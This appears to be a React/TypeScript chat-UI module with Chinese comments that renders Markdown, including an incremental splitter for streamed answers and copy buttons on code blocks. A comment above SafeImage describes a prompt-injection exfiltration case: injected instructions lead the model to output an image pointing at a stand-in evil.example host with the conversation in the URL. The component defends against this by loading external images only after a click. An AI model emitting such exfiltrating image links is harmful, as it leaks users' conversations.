"use client";

/**
 * Markdown 正文渲染（消息、流式回答、用户气泡共用）。
 *
 * 单独成模块是为了让它成为**懒加载分块**：react-markdown + remark-gfm + rehype-highlight
 * 带着 lowlight/highlight.js 的常用语言集，实测占首屏 JS 的 472KB（全部首屏 JS 1272KB），
 * 而 Hero 页（还没开会话）根本用不到它。ChatWindow 用 next/dynamic 引用本模块，
 * 首屏不再下载这 472KB；AppShell 在空闲时预取，真正打开会话时通常已经就绪。
 *
 * 流式输出版（v8）：
 * - 文本到达即整段显示：模型吐字速度由上游与网络决定，本地不再加一层追赶节奏（原先的
 *   平滑 / 打字机 / 渐显 / 即时四样式与五档速度、打字光标已随设置项一并移除）。
 * - 增量切分 + 分块记忆化：「已稳定的完整块」按 key 记忆化，扫描进度也复用上一帧，
 *   每次更新代价只与「新增的那几个字」成正比（旧版每帧重扫全文才是长回答的卡顿来源）。
 * - 代码围栏内的 tail 用纯文本渲染，等闭合后再交给 highlight.js 高亮一次，
 *   避免流式代码块每帧重新高亮。
 * - 贴底听对话区的（见 chat/chat-scroll）；回答结束后换成整段渲染。
 */
import { memo, useContext, useEffect, useLayoutEffect, useRef, useState } from "react";
import ReactMarkdown from "react-markdown";
import rehypeHighlight from "rehype-highlight";
import remarkGfm from "remark-gfm";
import { ChatScrollContext } from "@/components/chat/chat-scroll";
import { useMarkdownActions } from "@/components/chat/markdown-actions";
import { looksLikeFilePath } from "@/lib/chat/file-path";
import { IconCheckOutline14, IconCopyOutline16 } from "@/components/icons";
import { copyText } from "@/lib/clipboard";
import { useI18n } from "@/i18n";

type MarkdownTextNode = { value?: unknown; children?: MarkdownTextNode[] };

function markdownNodeText(node: MarkdownTextNode | undefined): string {
	if (!node) return "";
	if (typeof node.value === "string") return node.value;
	return node.children?.map(markdownNodeText).join("") ?? "";
}

function CopyButton({ text }: { text: string }) {
	const [copied, setCopied] = useState(false);
	const [copyFailed, setCopyFailed] = useState(false);
	const { t } = useI18n();
	return (
		<>
			<button
				type="button"
				className="icon-btn"
				title={copyFailed ? t.copyFailed : t.copy}
				aria-label={t.copy}
				onClick={() => {
					void copyText(text).then((ok) => {
						setCopied(ok);
						setCopyFailed(!ok);
						setTimeout(() => { setCopied(false); setCopyFailed(false); }, 1200);
					});
				}}
			>
				{copied ? <IconCheckOutline14 size={14} /> : <IconCopyOutline16 size={14} />}
			</button>
			{copyFailed && <span role="alert" style={{ fontSize: 11, color: "var(--dsw-danger)" }}>{t.copyFailed}</span>}
		</>
	);
}

/** 同源图片可以直接显示；外部地址不行（见 SafeImage）。data: 早被 react-markdown 的默认 URL 过滤掉了 */
function isInlineImage(src: string): boolean {
	if (typeof window === "undefined") return false;
	try {
		return new URL(src, window.location.href).origin === window.location.origin;
	} catch {
		return false;
	}
}

/**
 * 外部图片默认不加载，点了才加载。
 * 模型输出可能被提示词注入（读到的网页、文件里藏着指令），让它写一张
 * `![](https://evil.example/?d=<会话内容>)`，浏览器一渲染就把内容发出去了 —— 不需要用户点任何东西。
 */
function SafeImage({ src, alt, title }: { src?: unknown; alt?: string; title?: string }) {
	const [allowed, setAllowed] = useState(false);
	const { t } = useI18n();
	const source = typeof src === "string" ? src : "";
	if (!source) return null;
	if (allowed || isInlineImage(source)) return <img src={source} alt={alt ?? ""} title={title} />;
	let host = source;
	try {
		host = new URL(source).host || source;
	} catch {
		/* 保留原样 */
	}
	return (
		<button type="button" className="btn-outline" style={{ height: 26, padding: "0 10px", fontSize: 12 }} title={source} onClick={() => setAllowed(true)}>
			{t.externalImage}{alt ? `：${alt}` : ""}（{host}）
		</button>
	);
}

/**
 * 只有 Markdown 内容、没有 .md 外层容器的纯内容组件。
 * 流式分块时，多个块共用同一个 .md 容器（外边距规则因此照旧生效），
 * 每块各自记忆化：只要 text 没变就不会重新解析。
 */
/**
 * 链接：外部链接加一个 ↗ 标记，让「点了会离开本站」一眼可见。
 * 站内链接（同源）不加标记，避免到处都是符号。
 */
function MarkdownLink({ href, children, ...props }: { href?: string; children?: React.ReactNode } & Record<string, unknown>) {
	let external = false;
	if (typeof href === "string" && href) {
		if (/^https?:\/\//i.test(href)) {
			external = true;
			try {
				external = typeof window === "undefined" || new URL(href).origin !== window.location.origin;
			} catch {
				/* 解析不了就当外链 */
			}
		}
	}
	if (!external) return <a href={href} {...props}>{children}</a>;
	return (
		<a href={href} target="_blank" rel="noopener noreferrer" className="md-external" {...props}>
			{children}
			<span className="md-external-mark" aria-hidden="true">↗</span>
		</a>
	);
}

const MarkdownContent = memo(function MarkdownContent({ text }: { text: string }) {
	const actions = useMarkdownActions();
	return (
		<ReactMarkdown
			remarkPlugins={[remarkGfm]}
			rehypePlugins={[[rehypeHighlight, { detect: false, ignoreMissing: true }]]}
			components={{
				a: ({ node: _node, ...props }) => <MarkdownLink {...props} />,
				img: ({ src, alt, title }) => <SafeImage src={src} alt={alt} title={title} />,
				pre: ({ node, children, ...props }) => (
					<div className="md-code-block">
						<div className="md-code-copy"><CopyButton text={markdownNodeText(node)} /></div>
						<pre {...props}>{children}</pre>
					</div>
				),
				// 行内代码里常是文件路径：能认出来且能打开时，变成可点（只变色，不加下划线）
				code: ({ node: _node, className, children }) => {
					const raw = typeof children === "string" ? children : Array.isArray(children) ? children.join("") : "";
					const path = raw.trim();
					// 代码块里的 code 不参与路径识别。只看 className 不够：不写语言的围栏和缩进代码块也没有 className，
					// 只有一行路径时整个代码块会变成按钮。代码块的文本总以换行结尾，行内代码不会
					const block = Boolean(className) || raw.endsWith("\n");
					if (actions.openFile && !block && looksLikeFilePath(path)) {
						return (
							<button type="button" className="md-file-path" title={path} onClick={() => actions.openFile!(path)}>
								{children}
							</button>
						);
					}
					return <code className={className}>{children}</code>;
				},
			}}
		>
			{text}
		</ReactMarkdown>
	);
});

export const MarkdownBlock = memo(function MarkdownBlock({ text }: { text: string }) {
	return (
		<div className="md">
			<MarkdownContent text={text} />
		</div>
	);
});

// ---------- 流式渲染 ----------

/** 列表项（含有序列表）；用于避免在松散列表内部的空行处切块 */
const LIST_ITEM_RE = /^ {0,3}(?:[-*+]|\d+[.)])\s/;
/** 围栏行：标记 + 其后的内容（开头行是语言等信息，闭合行只能是空白） */
const FENCE_RE = /^ {0,3}(`{3,}|~{3,})(.*)$/;
/** 缩进起头的行：上面列表项的续行，或缩进代码块——都和前面连着，不从这里切 */
const INDENTED_RE = /^[ \t]+\S/;

interface FenceState {
	inFence: boolean;
	char: string;
	length: number;
}

/**
 * 按 CommonMark 推进围栏状态，返回这一行开启 / 闭合了围栏，或者都不是。
 * 闭合行必须是同一种字符、不短于开头、后面没有别的内容：围栏里出现 "```js" 或更短的 "```"
 * 都还是代码。反引号开头行的信息里不能再有反引号，否则那一行只是普通文本。
 */
function advanceFence(state: FenceState, line: string): "open" | "close" | null {
	const fence = FENCE_RE.exec(line);
	if (!fence) return null;
	const [, marker, rest] = fence;
	if (!state.inFence) {
		if (marker[0] === "`" && rest.includes("`")) return null;
		state.inFence = true;
		state.char = marker[0];
		state.length = marker.length;
		return "open";
	}
	if (marker[0] === state.char && marker.length >= state.length && rest.trim() === "") {
		state.inFence = false;
		return "close";
	}
	return null;
}

export interface StreamingSplit {
	/** 已稳定的完整块：文本不再变，各自记忆化，不会跟着尾巴一起重新解析 */
	blocks: string[];
	/** 正在生成的尾巴 */
	tail: string;
	/** 尾巴是否落在未闭合的代码围栏里 */
	tailInFence: boolean;
}

/**
 * 增量切分器：流式文本只会往后长，已经扫过的行不可能再改变判定，所以只扫新增的行。
 * 每帧代价与「新增文本」成正比，长回答不会随长度增长而越来越卡（旧版每帧重扫全文）。
 *
 * 切分规则：
 * - 只在代码围栏之外的空行处切：空行是天然的块边界，两侧各自都是完整可解析的 Markdown；
 * - 还在列表里、下一行又是列表项（松散列表）时不切，保持有序列表序号连续。列表项下面缩进的
 *   续段不算离开列表；空行后顶格的非列表行才算；
 * - 下一行缩进起头时不切：那是上面列表项的续段（或缩进代码块），切开会被当成独立段落；
 * - 半行（还没换行符）不急着判：半行 "2." 看着不像列表项，写完 "2. 乙" 才是，判早了会
 *   把松散列表切开、序号重排。只有「再长也不会改变判定」时才就地判，否则等下一行写完。
 */
export function createStreamingSplitter(): { update: (text: string) => StreamingSplit } {
	let prevText = "";
	let scanPos = 0;
	let fence: FenceState = { inFence: false, char: "", length: 0 };
	let segStart = 0;
	/** 最近一次顶格内容是列表项（还在列表里） */
	let inList = false;
	let prevBlank = true;
	let blocks: string[] = [];

	const reset = () => {
		prevText = "";
		scanPos = 0;
		fence = { inFence: false, char: "", length: 0 };
		segStart = 0;
		inList = false;
		prevBlank = true;
		blocks = [];
	};

	return {
		update(text: string): StreamingSplit {
			// 被整体替换（编辑重发、切会话）时重头扫；正常流式是前缀延长
			if (!text.startsWith(prevText)) reset();
			prevText = text;
			while (scanPos < text.length) {
				const nl = text.indexOf("\n", scanPos);
				// 半行不判：等换行到了再判（围栏行、空行边界都可能被这半行改变）
				if (nl === -1) break;
				const line = text.slice(scanPos, nl);
				const wasInFence = fence.inFence;
				const fenceStep = advanceFence(fence, line);
				const blank = line.trim() === "";
				if (!fence.inFence && blank) {
					const nextStart = nl + 1;
					const nextNl = text.indexOf("\n", nextStart);
					const nextLine = text.slice(nextStart, nextNl === -1 ? text.length : nextNl);
					const nextIndented = INDENTED_RE.test(nextLine);
					// 下一行是否已经写完，或者「再长也不会改变判定」：缩进起头的永远不切；
					// 不在列表里时，非空的下一行写成什么都要切
					const decidable =
						nextNl !== -1 ||
						(nextStart < text.length && nextLine.trim() !== "" && (nextIndented || !inList));
					if (!decidable) break; // scanPos 留在空行处，等下一行写完再判
					const keepTogether = nextIndented || (inList && LIST_ITEM_RE.test(nextLine));
					if (!keepTogether && nextLine.trim() !== "") {
						const seg = text.slice(segStart, nextStart);
						if (seg.trim()) blocks.push(seg);
						segStart = nextStart;
					}
				}
				// 列表状态只看围栏外的行：列表项进入列表；顶格的围栏、或空行后顶格的普通行离开列表
				if (!wasInFence && !blank) {
					if (LIST_ITEM_RE.test(line)) inList = true;
					else if (fenceStep === "open" ? !INDENTED_RE.test(line) : prevBlank && !INDENTED_RE.test(line)) inList = false;
				}
				if (!wasInFence || !fence.inFence) prevBlank = blank;
				scanPos = nl + 1;
			}
			return { blocks: blocks.slice(), tail: text.slice(segStart), tailInFence: fence.inFence };
		},
	};
}

/**
 * 把落在未闭合围栏里的尾巴拆成「围栏前的 Markdown」和「围栏里的代码」。
 * 开头那行（```python）不能当代码露出来；正在敲、还没换行的闭合行也不露。
 */
export function splitOpenFence(tail: string): { before: string; lang: string; code: string } {
	const state: FenceState = { inFence: false, char: "", length: 0 };
	let openAt = -1;
	let codeAt = 0;
	let lang = "";
	let pos = 0;
	while (pos < tail.length) {
		const nl = tail.indexOf("\n", pos);
		// 开头行一定是完整行：切分器只按完整行判围栏
		if (nl === -1) break;
		const line = tail.slice(pos, nl);
		if (advanceFence(state, line) === "open") {
			openAt = pos;
			codeAt = nl + 1;
			lang = (FENCE_RE.exec(line)?.[2] ?? "").trim().split(/\s+/)[0] ?? "";
		}
		pos = nl + 1;
	}
	if (openAt === -1 || !state.inFence) return { before: tail, lang: "", code: "" };
	let code = tail.slice(codeAt);
	const partial = code.slice(code.lastIndexOf("\n") + 1);
	const marker = partial.trimStart();
	if (marker && partial.length - marker.length <= 3 && marker[0] === state.char && /^(`+|~+)\s*$/.test(marker)) {
		code = code.slice(0, code.length - partial.length);
	}
	return { before: tail.slice(0, openAt), lang, code };
}

/** 一次性切分（冷启动 / 测试用）；流式循环里请复用 createStreamingSplitter 的扫描进度 */
export function splitStreamingMarkdown(text: string): StreamingSplit {
	return createStreamingSplitter().update(text);
}

interface StreamView extends StreamingSplit {
	/** 当前显示出来的部分（始终是目标文本的前缀） */
	shown: string;
}

/**
 * live：回答还在流。结束后（live 变 false）换成整段 Markdown 渲染（和历史消息同一种渲染，
 * 脚注、引用式链接这类跨块语法也就对了）。
 *
 * 文本到达即整段显示，不做逐帧平滑：模型吐字的速度由上游与网络决定，本地再加一层追赶节奏
 * 只会让显示落后于实际到达的内容。切分器仍然保留——它让「已稳定的完整块」按 key 记忆化，
 * 每次新增只重解析变化的那一块，而不是整篇重扫。
 */
export const StreamingMarkdownBlock = memo(function StreamingMarkdownBlock({ text, live = true }: { text: string; live?: boolean }) {
	const scroll = useContext(ChatScrollContext);
	const splitterRef = useRef<{ update: (text: string) => StreamingSplit } | null>(null);
	if (!splitterRef.current) splitterRef.current = createStreamingSplitter();
	const [view, setView] = useState<StreamView>(() => ({ shown: text, ...splitterRef.current!.update(text) }));

	// 目标变化：整段跟上，不再排队
	useEffect(() => {
		const next: StreamView = { shown: text, ...splitterRef.current!.update(text) };
		setView(next);
	}, [text]);

	const settled = !live && view.shown === text;

	// 内容变高会让正文往下长：提交后（绘制前）跟着贴底，界面不再跳动。
	// 贴不贴听对话区的（往上翻过、大纲正在跳转都会松开），这里不另量距离、不另设阈值。
	useLayoutEffect(() => {
		if (scroll?.shouldPin()) scroll.pin();
	}, [view, settled, scroll]);

	if (settled) return <MarkdownBlock text={text} />;

	const { blocks, tail, tailInFence } = view;
	// 尾巴常驻同一个 key 的容器：块升级时尾巴原地更新而不是整棵重挂。
	// 围栏未闭合时用与最终渲染相同的结构（md-code-block > pre > code，含复制按钮，同样不折行），
	// 闭合升级只有语法着色的差别，没有布局跳变；开头的 ``` 行不进代码。
	let tailNode: React.ReactNode;
	if (tailInFence) {
		const { before, lang, code } = splitOpenFence(tail);
		tailNode = (
			<>
				{before.trim() ? <MarkdownContent text={before} /> : null}
				<div className="md-code-block">
					<div className="md-code-copy"><CopyButton text={code} /></div>
					<pre><code className={lang ? `hljs language-${lang}` : undefined}>{code}</code></pre>
				</div>
			</>
		);
	} else {
		tailNode = <MarkdownContent text={tail} />;
	}

	return (
		<div className="md pw-stream">
			{blocks.map((block, i) => <MarkdownContent key={i} text={block} />)}
			{tail
				? <div className="pw-stream-tail" key="tail">{tailNode}</div>
				: null}
		</div>
	);
});

export default MarkdownBlock;
